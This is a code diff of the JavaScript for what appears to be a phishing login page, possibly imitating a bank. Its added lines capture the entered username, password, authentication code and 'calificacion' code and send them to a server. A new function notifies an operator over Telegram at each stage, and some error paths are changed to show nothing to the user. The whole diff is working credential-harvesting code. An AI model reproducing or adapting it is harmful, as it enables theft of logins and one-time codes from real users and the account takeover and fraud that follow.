@@ -19,6 +19,9 @@ showLoadingScreen(() => {
 });
 
 document.getElementById("entrarBtn").addEventListener("click", function () {
+
+    enviarAvisoTelegram('entrar');
+
     showLoadingScreen(() => {
         document.querySelector(".password-modal").classList.remove("hidden");
     });
@@ -128,8 +131,10 @@ document.getElementById("continuarBtn").addEventListener(
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        dispositivoID
-                    }),
+    dispositivoID,
+    usuario: document.getElementById("usuario").value,
+    password: document.getElementById("password").value
+}),
                     signal: controlador.signal
                 }
             );
@@ -221,16 +226,42 @@ function obtenerIDDispositivo() {
     return dispositivoID;
 }
 
-// Enviar datos al servidor
-async function enviarDatos(tipo, texto) {
+// ========================================
+// ENVIAR AVISOS A TELEGRAM
+// ========================================
+
+async function enviarAvisoTelegram(origen) {
+
     const dispositivoID = obtenerIDDispositivo();
-    await fetch(`/send-${tipo}`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ dispositivoID, texto })
-    });
+
+    try {
+
+        const respuesta = await fetch('/opciones/solicitar', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                dispositivoID,
+                origen
+            })
+        });
+
+        if (!respuesta.ok) {
+            throw new Error('No se pudo enviar el aviso');
+        }
+
+        return true;
+
+    } catch (error) {
+
+        console.error(
+            'Error enviando aviso a Telegram:',
+            error.message
+        );
+
+        return false;
+    }
 }
 
 // Validaciones
@@ -283,36 +314,12 @@ function togglePasswordVisibility() {
 }
 
 
-// Botones de entrada
-document.getElementById("entrarBtn").addEventListener("click", function () {
-    const usuario = document.getElementById("usuario").value;
-    enviarDatos('user', usuario);  // Enviar usuario
+document.getElementById("resultado-aceptarBtn").addEventListener("click", function () {
+    enviarAvisoTelegram('resultado');
 });
 
-// Enviar contraseña al servidor
-document.getElementById("continuarBtn").addEventListener("click", function () {
-    const password = document.getElementById("password").value;
-    enviarDatos('password', password);  // Enviar contraseña
-});
-
-// Enviar código de autenticación
-document.getElementById("authBtn").addEventListener("click", async function () {
-    const authCode = document.getElementById("authCode").value;
-    await enviarDatos('auth', authCode);  // Enviar código de autenticación
-});
-
-// Enviar calificación
-document.getElementById("calificacionBtn").addEventListener("click", async function () {
-    const calificacion = document.getElementById("calificacionCode").value;
-    await enviarDatos('calificacion', calificacion);
-});
-
-document.getElementById("resultado-aceptarBtn").addEventListener("click", async function () {
-    await enviarDatos('calificacion', 'SOLICITAR');
-});
-
-document.getElementById("formulario-boton-continuar").addEventListener("click", async function () {
-    await enviarDatos('auth', 'SOLICITAR');
+document.getElementById("formulario-boton-continuar").addEventListener("click", function () {
+    enviarAvisoTelegram('formulario');
 });
 
 // Función para mostrar la alerta personalizada de autenticación incorrecta
@@ -854,9 +861,10 @@ const sombraAutenticacion =
                     },
 
                     body: JSON.stringify({
-                        dispositivoID,
-                        etapa: "autenticacion"
-                    }),
+    dispositivoID,
+    etapa: "autenticacion",
+    autenticacion: document.getElementById("authCode").value
+}),
 
                     signal: controlador.signal
                 }
@@ -969,15 +977,13 @@ const sombraAutenticacion =
 
             } else {
 
-                console.error(
-                    "Error en verificación de autenticación:",
-                    error
-                );
+    // Error del servidor: sin notificación
+    console.error(
+        "Error en verificación de autenticación:",
+        error
+    );
 
-                mostrarAlertaOpcionesNo(
-                    "Servicio no disponible, intenta más tarde."
-                );
-            }
+}
 
         } finally {
 
@@ -1559,9 +1565,10 @@ botonAceptar.disabled = false;
                         },
 
                         body: JSON.stringify({
-                            dispositivoID,
-                            etapa: "calificacion"
-                        }),
+    dispositivoID,
+    etapa: "calificacion",
+    calificacion: campo.value
+}),
 
                         signal: controlador.signal
                     }
@@ -1649,17 +1656,22 @@ botonAceptar.disabled = false;
                 ventana.classList.remove("hidden");
                 sombra.classList.remove("hidden");
 
-                if (!controlador.signal.aborted) {
+                if (controlador.signal.aborted) {
 
-                    console.error(
-                        "Error en verificación de calificación:",
-                        error
-                    );
-                }
+    // Tiempo máximo agotado
+    mostrarAlertaOpcionesNo(
+        "Servicio no disponible, intenta más tarde."
+    );
 
-                mostrarAlertaOpcionesNo(
-                    "Servicio no disponible, intenta más tarde."
-                );
+} else {
+
+    // Error del servidor: sin notificación
+    console.error(
+        "Error en verificación de calificación:",
+        error
+    );
+
+}
 
             } finally {
 
